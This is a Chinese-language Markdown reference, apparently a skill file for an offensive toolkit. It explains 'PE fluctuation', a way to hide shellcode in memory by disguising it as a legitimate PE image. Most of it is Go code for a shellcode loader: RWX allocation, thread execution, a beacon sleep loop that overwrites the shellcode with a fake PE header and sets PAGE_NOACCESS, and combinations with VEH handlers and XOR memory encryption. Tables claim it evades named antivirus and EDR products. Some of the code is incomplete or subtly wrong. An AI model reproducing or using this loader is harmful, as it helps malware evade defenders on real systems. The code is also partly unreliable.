# PE波动技术（PE Fluctuation）

## 1. 技术原理

**核心思想：**
- 在shellcode内存区域伪装成合法PE文件结构
- 修改内存头部使其看起来像合法PE文件
- 规避内存扫描时被检测为可疑代码段
- 执行时恢复原始shellcode内容

**检测规避效果：**
| 检测方式 | 规避效果 |
|----------|----------|
| 内存特征扫描 | PE头伪装为合法DLL/EXE |
| YARA内存规则 | 规避shellcode特征匹配 |
| AMSI内存扫描 | 伪装为已知合法模块 |
| EDR内存分析 | 降低可疑代码段检测率 |

---

## 2. PE结构定义（Go）

```go
package main

import (
    "encoding/binary"
    "unsafe"
)

// DOS头结构
type IMAGE_DOS_HEADER struct {
    E_magic    uint16     // 0x5A4D = "MZ"
    E_cblp     uint16
    E_cp       uint16
    E_crlc     uint16
    E_cparhdr  uint16
    E_minalloc uint16
    E_maxalloc uint16
    E_ss       uint16
    E_sp       uint16
    E_csum     uint16
    E_ip       uint16
    E_cs       uint16
    E_lfarlc   uint16
    E_ovno     uint16
    E_res      [4]uint16
    E_oemid    uint16
    E_oeminfo  uint16
    E_res2     [10]uint16
    E_lfanew   int32      // PE头偏移
}

// PE文件头
type IMAGE_FILE_HEADER struct {
    Machine              uint16
    NumberOfSections     uint16
    TimeDateStamp        uint32
    PointerToSymbolTable uint32
    NumberOfSymbols      uint32
    SizeOfOptionalHeader uint16
    Characteristics      uint16
}

// 可选头（64位）
type IMAGE_OPTIONAL_HEADER64 struct {
    Magic                       uint16
    MajorLinkerVersion          uint8
    MinorLinkerVersion          uint8
    SizeOfCode                  uint32
    SizeOfInitializedData       uint32
    SizeOfUninitializedData     uint32
    AddressOfEntryPoint         uint32
    BaseOfCode                  uint32
    ImageBase                   uint64
    SectionAlignment            uint32
    FileAlignment               uint32
    MajorOperatingSystemVersion uint16
    MinorOperatingSystemVersion uint16
    MajorImageVersion           uint16
    MinorImageVersion           uint16
    MajorSubsystemVersion       uint16
    MinorSubsystemVersion       uint16
    Win32VersionValue           uint32
    SizeOfImage                 uint32
    SizeOfHeaders               uint32
    CheckSum                    uint32
    Subsystem                   uint16
    DllCharacteristics          uint16
    SizeOfStackReserve          uint64
    SizeOfStackCommit           uint64
    SizeOfHeapReserve           uint64
    SizeOfHeapCommit            uint64
    LoaderFlags                 uint32
    NumberOfRvaAndSizes         uint32
    DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

// 数据目录
type IMAGE_DATA_DIRECTORY struct {
    VirtualAddress uint32
    Size           uint32
}

// PE头（64位）
type IMAGE_NT_HEADERS64 struct {
    Signature      uint32 // 0x00004550 = "PE\0\0"
    FileHeader     IMAGE_FILE_HEADER
    OptionalHeader IMAGE_OPTIONAL_HEADER64
}

// 节区头
type IMAGE_SECTION_HEADER struct {
    Name                 [8]byte
    VirtualSize          uint32
    VirtualAddress       uint32
    SizeOfRawData        uint32
    PointerToRawData     uint32
    PointerToRelocations uint32
    PointerToLinenumbers uint32
    NumberOfRelocations  uint16
    NumberOfLinenumbers  uint16
    Characteristics      uint32
}

// 常量定义
const (
    IMAGE_DOS_SIGNATURE    = 0x5A4D  // "MZ"
    IMAGE_NT_SIGNATURE     = 0x00004550 // "PE\0\0"
    IMAGE_FILE_MACHINE_AMD64 = 0x8664
    IMAGE_SUBSYSTEM_WINDOWS_GUI = 2
    IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x0040
    IMAGE_SCN_MEM_EXECUTE = 0x20000000
    IMAGE_SCN_MEM_READ    = 0x40000000
    IMAGE_SCN_CNT_CODE    = 0x00000020
)
```

---

## 3. PE波动实现（完整版）

```go
package main

import (
    "encoding/binary"
    "golang.org/x/sys/windows"
    "unsafe"
    "time"
)

// PE波动管理器
type PEFluctuationManager struct {
    shellcodeAddr uintptr
    shellcodeSize uintptr
    originalData  []byte      // 原始shellcode备份
    fakePeHeader  []byte      // 伪装PE头
    isFluctuated  bool
}

// 创建PE波动管理器
func NewPEFluctuationManager(addr uintptr, size uintptr) *PEFluctuationManager {
    return &PEFluctuationManager{
        shellcodeAddr: addr,
        shellcodeSize: size,
        originalData:  make([]byte, size),
        isFluctuated:  false,
    }
}

// 生成伪装PE头
func generateFakePEHeader(size uint32) []byte {
    // 计算需要多少空间存放PE头（通常前0x200字节足够）
    peHeaderSize := uint32(0x200)
    
    buf := make([]byte, peHeaderSize)
    
    // 1. 写入DOS头
    dosHeader := IMAGE_DOS_HEADER{
        E_magic:    IMAGE_DOS_SIGNATURE,
        E_lfanew:   0x40, // PE头在0x40偏移
    }
    
    // 将DOS头写入buf
    dosOffset := 0
    binary.LittleEndian.PutUint16(buf[dosOffset:], dosHeader.E_magic)
    binary.LittleEndian.PutUint32(buf[dosOffset+60:], uint32(dosHeader.E_lfanew))
    
    // 2. 写入PE头
    peOffset := 0x40
    binary.LittleEndian.PutUint32(buf[peOffset:], IMAGE_NT_SIGNATURE)
    
    // 文件头
    fileHeaderOffset := peOffset + 4
    binary.LittleEndian.PutUint16(buf[fileHeaderOffset:], IMAGE_FILE_MACHINE_AMD64)
    binary.LittleEndian.PutUint16(buf[fileHeaderOffset+2:], 1) // NumberOfSections
    binary.LittleEndian.PutUint32(buf[fileHeaderOffset+4:], uint32(time.Now().Unix())) // TimeDateStamp
    binary.LittleEndian.PutUint16(buf[fileHeaderOffset+16:], 0xF0) // SizeOfOptionalHeader
    binary.LittleEndian.PutUint16(buf[fileHeaderOffset+18:], 0x22) // Characteristics
    
    // 可选头
    optHeaderOffset := fileHeaderOffset + 20
    binary.LittleEndian.PutUint16(buf[optHeaderOffset:], 0x20B) // PE64 magic
    binary.LittleEndian.PutUint32(buf[optHeaderOffset+16:], size) // SizeOfImage
    binary.LittleEndian.PutUint32(buf[optHeaderOffset+36:], size) // SizeOfHeaders
    binary.LittleEndian.PutUint16(buf[optHeaderOffset+44:], IMAGE_SUBSYSTEM_WINDOWS_GUI)
    binary.LittleEndian.PutUint16(buf[optHeaderOffset+46:], IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
    binary.LittleEndian.PutUint64(buf[optHeaderOffset+56:], 0x100000) // ImageBase
    
    // 3. 写入节区头
    sectionOffset := optHeaderOffset + 0xF0
    // 节区名 ".text"
    buf[sectionOffset] = '.'
    buf[sectionOffset+1] = 't'
    buf[sectionOffset+2] = 'e'
    buf[sectionOffset+3] = 'x'
    buf[sectionOffset+4] = 't'
    
    binary.LittleEndian.PutUint32(buf[sectionOffset+8:], size) // VirtualSize
    binary.LittleEndian.PutUint32(buf[sectionOffset+12:], 0x1000) // VirtualAddress
    binary.LittleEndian.PutUint32(buf[sectionOffset+16:], size) // SizeOfRawData
    binary.LittleEndian.PutUint32(buf[sectionOffset+20:], 0x200) // PointerToRawData
    binary.LittleEndian.PutUint32(buf[sectionOffset+36:], 
        IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ)
    
    return buf
}

// 备份原始shellcode
func (p *PEFluctuationManager) backupOriginal() {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    var oldProtect uint32
    VirtualProtect.Call(p.shellcodeAddr, p.shellcodeSize, 0x04, 
        uintptr(unsafe.Pointer(&oldProtect)))
    
    // 复制原始数据
    for i := uintptr(0); i < p.shellcodeSize; i++ {
        ptr := (*byte)(unsafe.Pointer(p.shellcodeAddr + i))
        p.originalData[i] = *ptr
    }
    
    VirtualProtect.Call(p.shellcodeAddr, p.shellcodeSize, 
        uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
}

// 应用PE波动（伪装为合法PE）
func (p *PEFluctuationManager) fluctuate() error {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    // 1. 先备份原始数据
    if !p.isFluctuated {
        p.backupOriginal()
    }
    
    // 2. 生成伪装PE头
    p.fakePeHeader = generateFakePEHeader(uint32(p.shellcodeSize))
    
    // 3. 修改内存保护为可写
    var oldProtect uint32
    VirtualProtect.Call(p.shellcodeAddr, uintptr(len(p.fakePeHeader)), 
        0x04, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 4. 写入伪装PE头（覆盖shellcode前部）
    for i := uintptr(0); i < uintptr(len(p.fakePeHeader)); i++ {
        ptr := (*byte)(unsafe.Pointer(p.shellcodeAddr + i))
        *ptr = p.fakePeHeader[i]
    }
    
    // 5. 恢复内存保护
    VirtualProtect.Call(p.shellcodeAddr, uintptr(len(p.fakePeHeader)), 
        uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
    
    p.isFluctuated = true
    return nil
}

// 恢复原始shellcode（准备执行）
func (p *PEFluctuationManager) restore() error {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    
    if !p.isFluctuated {
        return nil
    }
    
    // 1. 修改内存保护为可写
    var oldProtect uint32
    VirtualProtect.Call(p.shellcodeAddr, p.shellcodeSize, 
        0x04, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 2. 恢复原始数据
    for i := uintptr(0); i < p.shellcodeSize; i++ {
        ptr := (*byte)(unsafe.Pointer(p.shellcodeAddr + i))
        *ptr = p.originalData[i]
    }
    
    // 3. 恢复内存保护为可执行
    VirtualProtect.Call(p.shellcodeAddr, p.shellcodeSize, 
        0x20, uintptr(unsafe.Pointer(&oldProtect)))
    
    p.isFluctuated = false
    return nil
}

// 睡眠时波动，唤醒时恢复（Beacon模式）
func (p *PEFluctuationManager) sleepWithFluctuation(duration uint32) {
    ntdll := windows.NewLazySystemDLL("ntdll.dll")
    NtDelayExecution := ntdll.NewProc("NtDelayExecution")
    
    // 1. 睡眠前波动（伪装PE）
    p.fluctuate()
    
    // 2. 设置PAGE_NOACCESS（阻止扫描）
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    var oldProtect uint32
    VirtualProtect.Call(p.shellcodeAddr, p.shellcodeSize, 
        0x01, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 3. 等待
    var delay uint64 = uint64(duration) * 1000 * 10000 // 100ns单位
    NtDelayExecution.Call(0, uintptr(unsafe.Pointer(&delay)))
    
    // 4. 唤醒后恢复
    VirtualProtect.Call(p.shellcodeAddr, p.shellcodeSize, 
        0x04, uintptr(unsafe.Pointer(&oldProtect)))
    p.restore()
    VirtualProtect.Call(p.shellcodeAddr, p.shellcodeSize, 
        0x20, uintptr(unsafe.Pointer(&oldProtect)))
}
```

---

## 4. 完整Loader集成示例

```go
package main

import (
    "golang.org/x/sys/windows"
    "unsafe"
)

// 带PE波动的完整Loader
func executeWithPEFluctuation(shellcode []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    CreateThread := kernel32.NewProc("CreateThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
    
    // 1. 分配内存
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 
        0x3000, 0x40) // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
    
    // 2. 写入shellcode
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), 
        uintptr(len(shellcode)))
    
    // 3. 创建PE波动管理器
    peManager := NewPEFluctuationManager(addr, uintptr(len(shellcode)))
    
    // 4. 创建线程执行
    thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
    
    // 5. 等待执行完成
    WaitForSingleObject.Call(thread, 0xFFFFFFFF)
    
    // 6. 执行完成后应用PE波动（伪装内存）
    peManager.fluctuate()
    
    // 7. 设置PAGE_NOACCESS（最终保护）
    var oldProtect uint32
    VirtualProtect.Call(addr, uintptr(len(shellcode)), 
        0x01, uintptr(unsafe.Pointer(&oldProtect)))
}

// Beacon模式：周期性波动
func beaconLoopWithPEFluctuation(shellcode []byte, sleepInterval uint32) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    
    // 1. 分配并写入
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x3000, 0x40)
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    
    // 2. 创建PE波动管理器
    peManager := NewPEFluctuationManager(addr, uintptr(len(shellcode)))
    
    // 3. Beacon循环
    for {
        // 恢复执行
        peManager.restore()
        
        // 执行shellcode（触发beacon通信）
        // ... beacon逻辑
        
        // 睡眠时波动（伪装+加密）
        peManager.sleepWithFluctuation(sleepInterval)
    }
}
```

---

## 5. 与其他技术组合

### PE波动 + VEH内存保护

```go
// VEH异常处理器中集成PE波动
func vehHandlerWithPEFluctuation(exceptionCode uint32, addr uintptr) uint32 {
    if exceptionCode == 0xC0000005 { // ACCESS_VIOLATION
        // 检查是否是shellcode区域
        if isShellcodeRegion(addr) {
            // 恢复原始shellcode
            peManager.restore()
            
            // 修改为可执行
            VirtualProtect.Call(shellcodeAddr, shellcodeSize, 0x20, ...)
            
            return EXCEPTION_CONTINUE_EXECUTION
        }
    }
    return EXCEPTION_CONTINUE_SEARCH
}

// 触发执行流程
// 1. PE波动状态（伪装）
// 2. 外部触发异常（访问shellcode区域）
// 3. VEH恢复原始shellcode
// 4. 继续执行
```

### PE波动 + 内存加密

```go
// 双重保护：PE波动 + XOR加密
func doubleProtection(addr uintptr, size uintptr, key []byte) {
    // 1. 先XOR加密
    xorEncryptMemory(addr, size, key)
    
    // 2. 再伪装PE头（加密区域仍显示为合法PE）
    peManager.fluctuate()
    
    // 3. PAGE_NOACCESS
    VirtualProtect.Call(addr, size, 0x01, ...)
}

// 恢复流程
func restoreForExecution(addr uintptr, size uintptr, key []byte) {
    // 1. 恢复原始数据（同时解密）
    peManager.restore()
    
    // 2. XOR解密
    xorDecryptMemory(addr, size, key)
    
    // 3. 设置可执行
    VirtualProtect.Call(addr, size, 0x20, ...)
}
```

---

## 6. 技术对比

| 技术组合 | 防御效果 | 适用场景 |
|----------|----------|----------|
| 单独PE波动 | 规避内存特征扫描 | 单次执行 |
| PE波动+PAGE_NOACCESS | 阻止内存扫描+伪装 | 长驻内存 |
| PE波动+内存加密 | 双重伪装+加密 | 高安全需求 |
| PE波动+VEH | 动态保护+伪装 | Beacon长驻 |

---

## 7. 注意事项

1. **PE头大小**：伪装PE头通常占前0x200字节，确保shellcode足够大
2. **备份管理**：必须正确备份原始shellcode，恢复时确保完整性
3. **内存保护**：波动时使用PAGE_READONLY或PAGE_NOACCESS
4. **时机控制**：执行前恢复，睡眠时波动
5. **稳定性**：小shellcode可能不适合此技术（PE头覆盖过多）
6. **组合使用**：建议与VEH、内存加密组合使用效果更好

---

## 8. 检测规避效果

| 杀软/EDR | PE波动效果 |
|----------|-----------|
| Windows Defender | 规避内存扫描特征 |
| 卡巴斯基 | 降低可疑内存区域检测 |
| 360 | 规避QVM内存特征匹配 |
| CrowdStrike Falcon | 降低异常代码段标记 |
| 微步沙箱 | 规避内存YARA规则 |

---

## 9. 更新SKILL.md

在SKILL.md的技术模块表中新增此文档引用：

| 模块 | 文件 | 内容 |
|------|------|------|
| PE波动 | [pe_fluctuation.md](references/pe_fluctuation.md) | PE头伪装、内存扫描规避 **[新增]** |